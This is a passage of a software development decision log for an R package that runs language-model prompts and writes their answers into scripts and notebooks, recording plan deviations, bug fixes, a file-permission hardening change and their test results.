plan count for `test-cli-codex.R` is 155 higher on macOS and Linux (the two symbolic-link and
permission tests skip where those are unavailable).

## D-107 - P15 writer: a block a document_write hook patched carries the sha of its body as written, a block the transcript fallback wrote is recorded under the transcript, a child without an answer is not cached in S2, and a backend no writer handles writes nothing (2026-10-04)

P15 Task 9's plan-literal writer (`R/doc-blocks.R`: `doc_upsert()`, `doc_prepare()`,
`doc_upsert_fallback()`, `doc_after_write()`) changed in four ways. The interface of contract 7.15
(`doc_upsert(site, block_lines, block_id = NULL)` -> `list(action, block_id, lines, backend)`) and
the helpers the plan lists are unchanged; two internal helpers are new, `doc_patch_sha(lines, id)`
and `doc_header_set_sha(line, sha)`.

1. **A patched block's `sha=` is that of its body as written** (contract 11.5: `sha` is the
   "first 8 hex of sha256 of the body lines as last written"). The plan rendered the block with
   the sha of the body it was given and wrote whatever a `document_write` hook returned in its
   place, so a hook that added a line (the plan's own `# reviewed` test) left a block whose sha
   did not match its body: gptr's own write read as a hand edit at once (`user-edited`), so a
   later stale prompt replayed the old block instead of regenerating it, and the
   `gptr.doc_block` entry named the pre-patch sha. `doc_patch_sha()` now recomputes it after a
   patch: in a notebook cell's `metadata.gptr` (the `meta` attribute of the rendered lines),
   else in the header line of the one marker block with that id that the patched lines hold;
   when the patch holds no such block nothing is changed. In a header only the value of each
   `sha=` pair that `doc_parse_kv()` reads changes (`doc_header_set_sha()`): the hook may patch
   the lines (contract 10.4) and 11.5 allows any text after the id, so its free text, key
   spelling, order and quoting stay as written (review round 1: a rebuild with
   `doc_format_kv()` dropped `(reviewed by bob)` and wrote `reviewed-by=bob` back as `by=bob`).
   A header without `sha=` gets one after its last `model`/`date`/`prompt` pair (the 11.5
   order), else at the end of the line. The entry and the result carry the new sha.
2. **A block the transcript fallback wrote is recorded under the transcript** (contract 4.6
   `gptr.doc_block` `doc`; 10.2 row 18). After a format error the plan wrote the block into the
   console transcript but then recorded it under the original document: the entry said
   `doc = "a.R"`, `format = "r"`, `backend = "transcript"`, the S2 answers were keyed by `a.R`
   (where no block has that id, so replaying the transcript missed them) and the
   `gptr_source()` log of `a.R` got the transcript's block. Task 13's `session_tree` hook reads
   `data$doc` to make rewound blocks inert and appends its `# /rewind` note to every `doc` with
   `backend = "transcript"`: with the plan literal a rewind would have left the transcript block
   live and appended a transcript note to the user's script. `doc_upsert_fallback()` now returns
   the transcript's site with a written block (`res$site`, removed from the result before it is
   returned) and `doc_after_write()` records the entry, the S2 answers and the source log there.
3. **A child without an answer is not cached in S2** (IC-47). Team children without a report
   keep `NA` text (D-068 item 8) and a nested child may have none; the plan cached `k$text %||%
   ""`, so such a child was stored as a text (`NA` or empty) that a replay would return as the
   child's answer. It is now skipped, as the block's own answer is when it is `NA`: replaying
   that call is a miss (`auto` runs it, `replay` errors `not_recorded`).
4. **A backend no writer handles writes nothing.** The plan dispatched `pending`/`deferred` to
   `doc_pending_add()` (Task 10), `rstudio`/`positron`/`vscode` to `doc_ide_upsert()` (Task 11)
   and every other backend, unknown ones included, to the disk writer. The two writers do not
   exist yet, and naming them now fails the package lint (`object_usage_linter`: no visible
   global function definition, `dev/.validation/P15/task9-lint-plan-literal.log`) while
   suppressions and stubs are not allowed. Task 9 writes `file` and `transcript` sites and
   refuses any other backend with `gptr_error_doc_write` (`reason = "backend"`), which the
   writer's handler turns into a diagnostic and the transcript fallback, as the plan literal did
   at run time for the missing functions. **Task 10 adds the `pending`/`deferred` branch
   (`doc_pending_add(fmt, site, up, backend)`) and Task 11 the `rstudio`/`positron`/`vscode`
   branch (`doc_ide_upsert(fmt, site, up)`) before that refusal**, which then still refuses an
   unknown backend (the plan would have written a misspelt backend to disk, an open notebook
   included). No caller reaches `doc_upsert()` before Task 13.

IC-74 (07 section 6, P15 row): consent is checked first; the S2 records keep the model tag of
the block (`ollama/qwen3:8b`) and of each child and hold the answers redacted by `s2_put()`; the
writer calls no provider. Chat answers carry no model digest, so there is none to keep.

Validation: `progress/P15.md`, Task 9. Six tests added (+43 expectations); the plan's six tests
are verbatim. Against the plan-literal source the plan's tests pass and the added ones fail
`[ FAIL 17 | WARN 0 | SKIP 0 | PASS 313 ]` (`dev/.validation/P15/task9-plan-literal.log`; the
IC-74 test passes, coverage only); final `^doc-blocks$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 340 ]`
(`task9-fix1-green.log`), so every later plan count for `test-doc-blocks.R` is 43 higher than the
plan's (on top of the earlier D-062 and D-068 additions).

## D-108 - P08 gptr_config() and gptr_init(): a project scope never stores a relaxed local_only, protected settings are written only as whole objects, a malformed filter is refused before anything is written, identifier refusals name the setting, the scope and choice settings are one string, the templates and the .Rbuildignore line are written as LF lines, and gptr_init() keeps the trust across its own settings.json write (2026-10-04)

P08 Task 7's literal `gptr_config()`, `gptr_init()` and helpers (`R/gptr-config.R`) predate IC-74
and the implemented Task 3-6 interfaces. Behaviours that differ from the plan literal:

1. **A project scope never takes `providers.<id>.local_only = FALSE` (IC-74; 07-local-ollama.md
   section 5: "Only an explicit human user/session configuration can relax it; project settings
   ... cannot"; Task 3 obligation in `progress/P08.md`).** Contract 6.2 stores a project value
   that would loosen a `tighten` setting and never applies it. For the protected local-only
   control `gptr_config()` refuses it instead (`gptr_error_invalid_argument`, `arg = ".scope"`,
   naming `.scope = "user"` or `"session"`), so nothing that looks like a relaxation lands in a
   shared project file, where the layers (D-094 item 1) would ignore it silently. `TRUE` and
   other provider fields are still written; the user and session scopes relax it as before;
   model code is refused at every scope by `control_check()` (IC-53).
2. **`providers` and `egress` are written only as whole objects.** A dotted name below them
   (`providers.ollama.local_only`, `egress.corp`) is a known key only when an extension
   registers a `setting` spec of that name; the layers never read such a key from a file
   (D-094 item 9) and the spec's own `validate` would replace the core one. `gptr_config()`
   refuses it at every scope (`arg` = the key), as `.opts` refuses these namespaces (D-102
   item 2).
3. **A malformed filter is refused before anything is written (04 10.1).** The plan wrote the
   scope first and then called P02's `registry_filters_set()`, which raised for a malformed
   filter after the session layer already held it (Task 9 merges call filters into that list),
   while a user or project file kept it and only a notice followed. The form check of P02's
   `registry_filter_rx` now runs with the other value checks; P02's refusals (IC-53) stay
   diagnostics.
4. **Identifier refusals name the setting.** Task 6's `resolve_identifier()` serves
   `small_model` and `system1` directly (same pool as `model`), so `settings_ident()` passes the
   key; the plan mapped them to `"model"`, so `gptr_config(small_model = 3)` reported
   `arg = "model"`.
5. **`.scope` is one string.** P01's `check_choice()` takes the whole vector of choices as its
   first element, so `.scope = c("session", "project", "user")` silently meant `"session"`;
   Task 5's `gateway_choice()` is used instead.
6. **LF lines.** `template_copy()` reads the installed template as text and writes it with
   `write_atomic()` (LF, final newline; contract 11), so a template checked out with CRLF line
   endings is not copied byte for byte. `init_rbuildignore()` writes the lines themselves; the
   plan pasted a final newline into the text that `write_atomic()` ends with another one, leaving
   a blank last line in `.Rbuildignore`.
7. **`gptr_init()`'s own `settings.json` write re-fingerprints (IC-52: "gptr's own writes
   re-fingerprint"; review round 1).** The plan copied the trust-gated `.gptr/settings.json`
   without carrying over the trust that held, so a non-interactive `gptr_init()` voided a
   recorded trust (or a decision of this process) for a project that had no `settings.json` yet,
   and the project's settings, extensions and MCP servers were then dropped with a notice.
   `init_settings()` writes it under the file's short lock (IC-71) and hands the sha256 of the
   bytes `template_copy()` wrote to `trust_carry()`, the step `settings_write()` already took
   (now shared): a recorded trust gets the new fingerprint, an in-process decision keeps it in
   memory, and a gated file changed beside the write (or a trust already voided) still lapses.
8. **A `choice` setting takes one value.** The core `setting` validators used P01's
   `check_choice()`, which reads the whole choice vector as its first element, so
   `gptr_config(context = c("none", "names", "summary"))` stored `"none"`; they use Task 5's
   `gateway_choice()` (as item 5 does for `.scope`).

The Task 4 temporary skip (D-099 item 8) is removed: the egress hint test now evaluates the hint
through `gptr_config()`.

Validation: `progress/P08.md`, Task 7. Red (no Task 7 code) `^gptr-config$`
`[ FAIL 20 | WARN 0 | SKIP 1 | PASS 359 ]` (`dev/.validation/P08/task7-red.log`, all
`could not find function`); against the plan-literal source
`[ FAIL 42 | WARN 0 | SKIP 1 | PASS 410 ]` (`task7-red-adaptations-against-plan-literal.log`,
every failure in the six adaptation tests); green `[ FAIL 0 | WARN 0 | SKIP 1 | PASS 464 ]`
(`task7-green.log`; the skip is P11's `gptr_permissions()` leg). Review round 1 (items 7-8):
red `[ FAIL 19 | WARN 0 | SKIP 1 | PASS 475 ]` (`task7-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 1 | PASS 494 ]` (`task7-fix1-green.log`).

## D-109 - P15 deferred and pending writes: a sidecar of an earlier process with this pid is a dead one, a deferred run's lock is held together with its exit finalizer, the script this process runs under Rscript is never written before exit, a pending record forgets blocks another process synced, a kernel that cannot name its notebook treats the notebooks in its working directory as open, recovered paths are kept absolute, the sidecar is replaced whole, and (review round 1) a sidecar is read only as this user's private record for its own document, adopted upserts are applied after this run's own, the sidecar lives in the document's project, an upsert whose sidecar write failed is not queued, and (review round 2) a sync never writes a live run's script, a call's newest queued block is the one written, a kernel's notebook stays open after setwd() and only .ipynb files are notebooks (2026-10-04)

P15 Task 10's plan-literal deferred-write code (`R/doc-io.R`: `doc_sidecar_write()`,
`doc_sidecar_live()`, `doc_pending_add()`, `doc_recover()`, `doc_notebook_attached()`,
`doc_sync()`) changed in seven ways. The produced interfaces of the plan are unchanged; new
`@noRd` helpers are `doc_sidecar_mine(rec)`, `doc_pending_reconcile(rec)`,
`doc_script_running(path)` (`R/doc-io.R`) and `doc_rscript_running()` (`R/doc-locate.R`, now
shared with `doc_site_rscript()`, whose behaviour is unchanged). Task 9's obligation (D-107 item
4) is met: `doc_upsert()` dispatches `deferred` and `pending` sites to `doc_pending_add()` before
its refusal of unknown backends.

1. **A sidecar of an earlier process that had this pid is a dead one (IC-51: "unapplied upserts
   of a dead pid").** The plan recorded the process creation time "against pid reuse" but
   `doc_sidecar_live()` returned TRUE for any record with this pid. Containers give each run the
   same small pid, so a killed run's sidecar was then never recovered, and the next run's first
   deferred upsert did not adopt it and overwrote it. `doc_sidecar_mine()` compares the creation
   time as well (without one on either side the pid decides, as before); other pids go through
   P04's `pid_alive(pid, create_time)`.
2. **A deferred run's lock is held together with its exit finalizer.** The plan took the run lock
   (`doc_lock_hold()`) before preparing the block but registered the finalizer, which releases
   it, only after a block was queued. When the first deferred block of a run was not queued
   (call not found, a user-edited block, a `document_write` hook blocking it) the lock directory
   outlived the process until the next touch broke it as stale. `doc_finalizer_ensure()` now runs
   as soon as the lock is held, as `doc_recover(defer = TRUE)` already did.
3. **The script this process runs under Rscript is never written before exit (report 14 section
   2.1.2 items 6-7: rewriting a script Rscript is running corrupts the run; IC-51).**
   `doc_script_running(path)` is TRUE when this process holds the document's run lock or
   `Rscript --file=` names it (`doc_rscript_running()`, the file `doc_site_rscript()` locates
   calls in). Then `doc_recover(path)` adopts a dead run's upserts into this run's deferred
   writes instead of applying them now (so `gptr_doc("analysis.R")` at the top of
   `analysis.R`, or `gptr_blocks()` inside it, does not rewrite the running script), and
   `doc_sync(path)` adopts, prints a notice and returns 0. The plan applied both at once, and
   `doc_sync()` also wrote this process's own queued blocks into the running script and dropped
   them from the exit flush.
4. **A pending record forgets blocks another R process synced (IC-50).** `gptr_doc(path, sync =
   TRUE)` in another session applies a kernel's pending blocks and removes them from the sidecar,
   but the kernel kept them in `the$doc_pending` and wrote them back into the sidecar with its
   next pending block, so the next sync re-inserted an agent cell the user had deleted since (or
   reported one the user had edited as a conflict, kept in the sidecar for good).
   `doc_pending_reconcile()` keeps only the upserts that this process's sidecar still holds (none
   when it is gone) before a pending block is queued or synced; a sidecar another process wrote
   meanwhile leaves the record as it was.
5. **A kernel that cannot name its notebook treats the notebooks in its working directory as
   open (IC-50: gptr never writes the open notebook).** `doc_site_jupyter()` (Task 8) finds the
   kernel's notebook by content among the notebooks of the working directory when
   `JPY_SESSION_NAME` is unset or names no existing file (for example a path relative to the
   Jupyter server's root rather than the kernel's directory). The plan's
   `doc_notebook_attached()` was then always FALSE, so `gptr_doc(path, sync = TRUE)` run in that
   kernel wrote the notebook it runs. Each notebook in the working directory now counts as
   attached in that case; `JPY_SESSION_NAME` naming an existing file decides as before.
6. **Recovered paths are kept absolute.** `doc_recover()` and `doc_sync()` normalise the path
   first; the plan stored a relative path in the deferred record, which the exit flush resolved
   against the working directory of that time (a conflict warning, the block not written, and a
   second sidecar under the other path's key).
7. **The sidecar is replaced whole (IC-51: "SIGTERM loses at most one call").** The plan wrote it
   in place with `save_rds()`, so a write cut short (SIGTERM during the flush after a call, a
   full disk) left a truncated file that `doc_sidecar_read()` reads as no sidecar: every queued
   block was lost. `doc_sidecar_write()` now writes the same bytes (`serialize_leaf()`,
   uncompressed and `ascii = FALSE`, byte-identical to `save_rds()`'s and read by `readRDS()`)
   through P01's `write_atomic()` (rename with retries, in-place fallback).

Not changed (recorded in `progress/P15.md`, Task 10): with array jobs the process that holds the
run lock writes the shared script at its exit while siblings may still be running it (IC-51's
design; on Unix the atomic rename should leave their open script on the old inode, the in-place
fallback cannot, not verified here); a queued regeneration of a hand-edited notebook cell that
the user agreed to is a conflict at sync (the cell may have changed again since); two kernels
running the same notebook overwrite each other's pending sidecar.

IC-74 (07 section 6, P15 row): consent is checked before anything is queued (no sidecar, no
lock without it) and a local model's tag (`ollama/qwen3:8b`) survives the sidecar into the
written header (new coverage test); nothing here calls a provider.

Review round 1 (`progress/P15.md`, Task 10, Review round 1) added four more changes:

8. **A sidecar is read only as this user's private record for its own document (IC-51: the
   recovery writes "that document"; IC-52: the project cannot plant settings).** The sidecar
   lives in the project tree, and the plan applied whatever `doc` and `site$format` the file
   named. A planted record for `analysis.R` could therefore create or append to any file outside
   the project (for example `~/.Rprofile`, through the append-only `transcript` format) on the
   next `gptr()`, `gptr_blocks()` or `gptr_doc()` that touched `analysis.R`, with no write
   consent. `doc_sidecar_read(path)` now returns NULL unless:
   - on Unix, the file belongs to the effective uid and has no group or other mode bits
     (`doc_sidecar_trusted()`; `write_atomic()` creates sidecars 0600, and a checked-out file
     keeps the umask's bits). A rejected file is never passed to `readRDS()`, which can run code
     before R 4.4 (CVE-2024-27322; DESCRIPTION allows R 4.2);
   - `path_key(rec$doc)` is the document's;
   - the kind is `deferred` or `pending`;
   - every upsert has a block id of the block grammar, character lines, `site$format` equal to
     the document's own `r` or `ipynb` format, and no `site$path` naming another file
     (`doc_sidecar_valid()`, `doc_sidecar_upsert_ok()`).

   `doc_sidecar_write()` removes a rejected file before writing, because `write_atomic()` keeps
   the mode of the file it replaces. A pending record whose sidecar exists but cannot be read is
   kept as it is (`doc_pending_reconcile()`). Recovery does not ask for consent again: the
   upserts were consented to when they were queued. On a Unix file system that ignores modes, no
   sidecar is trusted, so a killed run's blocks are not recovered there.
9. **This run's upserts are applied before adopted ones (IC-51).** The plan queued a dead run's
   upserts before this run's own. `doc_apply_upserts()` treats an upsert whose call already owns
   a fresh block as superseded, so a script re-run after a kill had its re-recorded block for the
   same call silently dropped at exit (reported as `insert` and logged, but never written), and
   the dead run's older code was kept. `doc_upserts_adopt()` marks adopted upserts and appends
   them. `doc_upserts_push()` queues an own upsert before the adopted ones. The stored order is
   newest process first, so after a chain of killed runs the newest run's block wins.
10. **The sidecar lives in the document's own project.** `doc_sidecar_path()` used the working
    directory's workspace root, so a job that `setwd()`s out of its project (or that cron starts
    from `$HOME`) wrote its sidecar to `tempdir()`, where no later process finds it after a
    SIGTERM. It now uses `workspace_dir(dirname(path)) %||% doc_root()`. Task 4's
    `doc_lock_dir()` still follows the working directory (a follow-up; not changed here).
11. **An upsert whose sidecar write failed is not queued.** `doc_pending_add()` and
    `doc_recover(defer = TRUE)` now write the sidecar before they store the record in memory.
    `doc_upsert()` reports such an upsert as `failed`, possibly with a transcript fallback, and
    the exit no longer writes it anyway. `doc_recover(defer = TRUE)` also registers the
    finalizer as soon as it holds the lock (item 2's rule).

Review round 1 validation: four regression tests and three assertions in the atomic-sidecar
test (+67 expectations). Old source: `[ FAIL 45 | WARN 0 | SKIP 0 | PASS 190 ]`
(`dev/.validation/P15/task10-fix1-red.log`). Final `^doc-io$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 239 ]` (`task10-fix1-green.log`).

Review round 2 (`progress/P15.md`, Task 10, Review round 2) added four more changes:

12. **A sync never writes the script of a live run (IC-51: only "unapplied upserts of a dead
    pid" are re-applied; report 14 section 2.1.2).** `doc_sync()` applied a deferred record from
    disk whatever its owner, relying on `doc_lock()`. Since item 10 the sidecar follows the
    document's project while `doc_lock_dir()` follows the working directory, so a live run
    started elsewhere (cron from `$HOME`) holds its lock in another root and its script could be
    rewritten while running. `doc_sync()` now refuses a `deferred` record whose owner is alive
    (`doc_sidecar_live()`): a notice, and 0. Pending (Jupyter) records are still synced from
    other sessions (IC-50).
13. **A call's newest queued block is the one written (IC-50: the block shown last).** A notebook
    cell run again queues a second `insert` with a new id, because the pending block is not in
    the notebook. `doc_apply_upserts()` then inserted the oldest and superseded the newer one,
    counting it as applied. `doc_upserts_drop_call()` drops this process's queued upserts for the
    call that a new upsert's site locates (same statement or cell and same call position, found
    only among upserts with the same anchored prompt hash) before that upsert is queued.
    Adopted upserts keep item 9's order. The queue is not reordered newest first (the
    reviewer's first suggestion), because that would write the blocks of several calls of one
    statement or cell in reverse order. `doc_apply_upserts()` returns `list(applied, superseded,
    conflicts)`, and `applied` holds only written blocks, so `doc_sync()` counts the blocks it
    writes. This adds one element to the plan's `list(applied, conflicts)`.
14. **A notebook a kernel queued pending blocks for stays open after `setwd()` (IC-50).** When
    `JPY_SESSION_NAME` names no existing file, `doc_notebook_attached()` is also TRUE for a
    notebook that this process holds a pending record for, not only for the notebooks of the
    current working directory.
15. **Only `.ipynb` files are notebooks.** Item 5's rule made every file of a kernel's working
    directory "attached", `.R` scripts included, so a sync of a dead run's script from that
    kernel aborted. `doc_notebook_attached()` is FALSE for other formats.

Review round 2 validation: four regression tests (+29 expectations). Round 1 source:
`[ FAIL 15 | WARN 0 | SKIP 0 | PASS 252 ]` (`dev/.validation/P15/task10-fix2-red.log`). Final
`^doc-io$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 268 ]` (`task10-fix2-green.log`).

Validation: `progress/P15.md`, Task 10. Eight tests added (+47 expectations; the plan's five are
verbatim except the fixture path resolved before `local_project()`, the Task 4 trap). Against the
plan-literal source the plan's tests pass and the added ones fail
`[ FAIL 23 | WARN 1 | SKIP 0 | PASS 149 ]` (`dev/.validation/P15/task10-adapt-red-final.log`; the
IC-74 test passes, coverage only); final `^doc-io$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 172 ]`
(`task10-green.log`).

## D-110 - P13 System 1 states: POSIXlt date-times give one state per element, row records read matrix, data-frame and POSIXlt columns by row, I() of a small list is sent as the list, classed elements are sent without their names, a piped session's state never exceeds gptr.s1_state_max, and no state is built through a container that points at the user's elements (2026-10-04)

P13 Task 7 (`R/s1-route.R`, `tests/testthat/test-s1-route.R`, and `s1_test_call()` restored in
`tests/testthat/fixtures/jev/harness.R` now that P08's `call_new()` exists, 24be22b). The rest of
the plan's code is verbatim, and its 9 tests (48 expectations) are unchanged. Six points differ
from the plan-literal code:

- points 1-5 follow the batch rule of architecture 4.1.5, or contract 3.1/7.13 ("at most
  `gptr.s1_state_max` characters");
- point 6 is copy safety (architecture 6.4 R1, R4).

Points 5 and 6 and the current forms of points 1-3 come from round 1 of the Task 7 review.

1. **POSIXlt vectors.** A POSIXlt vector is a list underneath, so the plan's rule read it as a
   classed list. It became one state holding a list of formatted strings, while the same times
   as POSIXct gave one state per element. POSIXlt now counts as an atomic vector: one state per
   element, formatted like POSIXct. Its elements are read component by component
   (`s1_lt_n()`, `s1_lt_take()`; point 6).
2. **Row records (`s1_df_record()`, `s1_cell()`).** The plan read every unclassed column with
   `.subset2(col, i)`. That reads the wrong cell in three cases:
   - a matrix column: element `i` in column-major order;
   - a nested data frame: its column `i`, so row 2 of a one-column nested data frame fails with
     "subscript out of bounds";
   - a POSIXlt column: its component `i` (`sec`, `min`, ...).

   Each case now reads row `i`:
   - an atomic matrix column gives `col[i, , drop = TRUE]`, so a named row is a JSON object;
   - a list-matrix column is read element by element (`s1_list_row()`);
   - a nested data-frame column gives its own row record, so its inner names are kept even
     with one column;
   - a POSIXlt column gives element `i`, like other classed vectors.

   List columns, `I(list(...))` included, still use `.subset2()`.
3. **`I(list(...))`.** AsIs makes the list a classed object, so the plan sent its describer text.
   `I(x)` only marks "exactly one state". A list whose only class is AsIs is now walked in place
   like a plain list (at most 100 elements and three levels), as `I()` of an atomic vector
   already was. A larger one is still described.
4. **The session state cap.** The plan cut only the answer. A long status reason or value name
   (the facts) could therefore make the state longer than `gptr.s1_state_max`. As a last step,
   the whole state is now cut to the cap and ends in `...`. The answer is still cut first, so
   the output is the plan's whenever the facts fit.
5. **Names of classed elements.** The plan read a classed element with `values[i]`, which keeps
   its name. So a named factor, Date or date-time vector sent each element as a one-key object
   (`{"f": {"a": "x"}}`), while the same named character vector sent `{"f": "x"}`. The element's
   name is now dropped (`s1_element()`). The names stay on the list of states, as the batch rule
   says, so the model sees the same state, and the cache gets the same key, whatever the class.
6. **No container that points at the user's elements.** R never lowers reference counts during
   garbage collection (architecture 6.4). A temporary container that holds the user's elements
   therefore makes the user's next in-place edit of an element copy it. Tracemem found such a
   container in each of these:
   - the first form of point 3 (a shallow copy without AsIs);
   - `[.data.frame` on a nested data-frame column and `[` on a list-matrix column (the first
     form of point 2);
   - `length()`, `[` and `format()` of a POSIXlt, which all call `unclass()`. This covers the
     first form of point 1 and the plan's own `format()` of a POSIXlt held in a list or `I()`.

   These values are now read with `.subset2()`. Base R copies the components of a named POSIXlt
   on its next edit even without gptr, so tracemem cannot test that case.

Evidence (`dev/.validation/P13/`):

- Before the review, with the plan-literal file swapped in:
  `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 55 ]` (`task7-negative.log`, 60 expectations).
- After review round 1, the plan-literal file with the final tests:
  `[ FAIL 10 | WARN 0 | SKIP 0 | PASS 58 ]` (`task7-fix1-negative-plan.log`). The 10 failures
  include the "subscript out of bounds" error and the POSIXlt copy row.
- The pre-review file with the final tests: `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 61 ]`
  (`task7-fix1-negative.log`).
- The final run: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 68 ]` (`task7-fix1-green.log`).

## D-112 - P09 builtin:workspace: the workspace baseline is kept in the session's live memo, shared by the block providers and the agent_end hook and never inside a plugin's persisted state; a prompt preview remembers nothing; a session without a home is labelled by the listed environment; P07's floor tests hide the skill_content block (2026-10-04)

P09 Task 10's plan-literal `builtin:workspace` (`R/env-snapshot.R`) is changed in three ways.
The block, section, evaluator, hook and service names, placements, orders and budgets, the
provider and service signatures and the plan's 8 test blocks (`tests/testthat/test-env-snapshot.R`)
are unchanged. The plan-literal file is kept as
`dev/.validation/P09/task10-env-snapshot-plan-literal.R`.

1. **The workspace baseline is one environment per live session, in its live record's `memo`.**
   The plan kept it "in an environment inside `ctx$state()`" (Self-review ambiguity 7). In the
   implemented P02/P06, `ctx$state()` is one state per extension source (`ctx_ext_label()` of the
   ctx's `.source`). P07's `context_provide()` calls `provide(ctx, budget)` without a source, so
   the providers get the state labelled `plugin`, which every sourceless caller (a plugin's tool,
   for example) shares. P02's `ev_call()` runs the `agent_end` hook as `builtin:workspace`, so the
   hook gets the state labelled `workspace`. With the plan-literal code:
   - the hook never refreshed the baseline the providers read, so the next `<workspace_changes>`
     reported the agent's own new objects as the user's changes;
   - the environment stored in the shared `plugin` state made P06's `plugin_state_persist()` skip
     that whole state (`json_encode()` fails on an environment), so another extension's
     sourceless `ctx$state()` values were no longer persisted.
   `env_memory()` now keeps the baseline under `gptr_workspace` in `session_live(s)$memo` (kernel
   SDK, memory only; P06 keeps `tool_schemas` and P07 its `prompt_*` keys there). A ctx without a
   live session uses `ctx$state()` (the plan tests' fake ctx), else a fresh environment, so
   nothing is kept. The memory still dies with the session, and is still never persisted.
2. **A prompt preview changes nothing.** `gptr_prompt()` renders the first message with
   `input$preview = TRUE` (P07's `context_input()`; D-079: a preview has no side effects). The
   plan's `env_block_workspace()` stored the snapshot and started the history log in a preview,
   so a preview reset the baseline (the next `<workspace_changes>` lost the user's changes made
   before it) and registered the task callback. `env_remember()` now returns at once in a
   preview; the block text is unchanged.
3. **A session without a home is labelled by the environment listed.** P06's `home_label()` is
   `"<none>"` for a session without a home, whose block lists the run's environment
   (`ctx$envir`). The `env` attribute then reads `globalenv` or `<environment>`, as for a ctx
   without a session. Any other session label is used as the plan says.

Outside P09's files, two P07 tests in `tests/testthat/test-prompt-sections.R` ("the floor counts
the project instructions the frozen audience will be sent (IC-52)" and "cut re-injection budgets
are recorded in gptr.frozen and survive a restore (IC-71)") assumed that no `skill_content` block
is registered. P07's `prompt_freeze()` reserves its 10,000-token re-injection budget once the
block exists, by design. With P09 loaded, that budget alone overruns the tests' 24,000-token
window, so both budgets were cut to 1,904 and the withheld-instructions path no longer kept full
budgets (8 failures). The tests now hide the block with a pass-through mock of `registry_get()`
(`local_no_skill_block()`), which restores their premise; their expectations and P07's code are
unchanged.

Validation: `progress/P09.md`, Task 10. Against the plan-literal source, the added blocks give
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 134 ]` (`task10-red-adaptations.log`). The real session's
`plugin` state holds an environment, `<workspace_changes>` lists `made_by_agent` after
`agent_end`, a preview registers the history callback and stores a snapshot, and the label is
`"<none>"`.

## D-111 - Hosted CI after the prompt, adapter and gateway waves: file extensions are read without basename() in every locale and on every R, path_norm() expands ~ before it turns backslashes into slashes, every file is checked out without line-end conversion, and Windows runs the non-ASCII name tests in its UTF-8 locale (2026-10-04)

Hosted runs 37262066260 (`0398aee`), 37266727707 (`bdf7c18`) and the completed jobs of
37269169488 (`01e13a5`) failed every R CMD check job on R 4.6.1, devel and Windows, and the
connections job. CI Task CI-5 fixes them. Four of its changes go beyond a single test:

1. **File extensions are read by `path_ext()` and `path_sans_ext()`** (`R/utils-paths.R`, P01;
   IC-62). R 4.6 changed `tools::file_ext()` and `tools::file_path_sans_ext()` to test the
   extension on `basename(x)`, and `basename()` translates to the native encoding, so it stops on
   a marked UTF-8 non-ASCII path in a non-UTF-8 locale ("unable to translate 'caf<U+00E9>.r' to
   native encoding"). D-057 item 1 had removed gptr's own `basename()` calls from the search
   tools for this reason, but `find_relevance()` still called `tools::file_path_sans_ext()`, so
   every relevance sort that met a non-ASCII name failed again on R 4.6 (hosted
   `test-tool-search.R:223` on Ubuntu release, devel, LC_ALL=C, no-Suggests, macOS and the
   connections job). The read tool's `read_token_class()` and `read_binary_text()` called
   `tools::file_ext()` on the absolute path, so reading `caf\u00e9.R` or `caf\u00e9.rds` failed the same
   way (no hosted test covered it; reproduced with the R 4.6 bodies). The helpers keep R 4.6's
   rule without translating: the extension is the alphanumeric run after the last dot of the
   last component, with at least one character that is not a dot before that dot; "/" and "\\"
   separate components. Four differences from `tools`, all deliberate: the alphanumeric class is
   ASCII in every locale (R's TRE class also counts letters such as U+00E9 in a UTF-8 locale); on
   R 4.5 and earlier the rule is R 4.6's, not the older one (`tools::file_ext(".Rprofile")` was
   `"Rprofile"` there, `path_ext()` gives `""`, as R 4.6 does); "\\" separates components on
   every OS, as in `path_norm()`, so `"dir\\.env"` has no extension on macOS and Linux either
   (`tools`, whose `basename()` splits only at "/" there, gives `"env"`); and a path that ends in
   a separator has no extension (`tools::file_ext("trail.R/")` returns the whole `"trail.R/"`,
   because `basename()` drops the trailing separator but the extension is cut from the full
   path; both sans-extension functions return such a path unchanged). The test pins both cases.
   The relevance classes of IC-71 and the read tool's estimator classes change only for such
   names. `R/doc-io.R:63` (P15, in flight) and `R/ext-specs.R:1330` (P17) still call
   `tools::file_ext()`; see the open items of `progress/ci-hosted.md`, Task CI-5.
2. **`path_norm()` expands `~` before it turns backslashes into slashes** (`R/utils-paths.R`,
   P01; IC-63). It converted first, so a home with backslashes stayed in the result, and on
   Windows a home of the form `C:\...` was not absolute and was joined to the working directory.
   The real `user_home()` already returns forward slashes, so nothing changes for it; the hosted
   Windows failures (`test-ext-plugins.R:481`, `test-skill-discover.R:295-297`) came from tests
   that mock `user_home()` with `withr::local_tempdir()`, whose path has backslashes on
   Windows. `path_norm()` now gives forward slashes whatever `user_home()` returns.
3. **Every file is checked out byte for byte** (`.gitattributes`: `* -text`). The Windows
   runners set `core.autocrlf=true`, so `actions/checkout` wrote every LF text file with CRLF:
   the document fixtures stopped parsing and round-tripping (15 failures in
   `test-doc-formats.R`) and the shipped risk tables held CR bytes (`test-perm-classify.R:19`).
   With the attribute unset, git converts no line ends on checkout or check-in, so the three
   fixtures that hold CRLF on purpose keep it, and no file is renormalised. R CMD build leaves
   `.gitattributes` out of the tarball by itself (`tools:::.hidden_file_exclusions`, R 4.2 and
   later), so the package is unchanged.
4. **On Windows the non-ASCII name tests keep R's UTF-8 locale** (`local_name_locale()`,
   `tests/testthat/helper-locale.R`; amends D-057's "in any locale"). Windows R translates every
   path it hands the file system to the native encoding, which in a C locale cannot hold a
   non-ASCII name, so R itself cannot list or open `caf\u00e9.R` there (hosted Windows release and
   oldrel-4: `list.files()` warned "unable to translate ... to native encoding", `ls` gave
   "(empty directory)" and `grep` "No matches found"). No pure-R product change can do better.
   On macOS and Linux the tests still run in the C locale; on Windows they run in R's own
   locale, which is UTF-8 on R 4.2 and later (they skip if it is not).

Validation: `progress/ci-hosted.md`, Task CI-5.

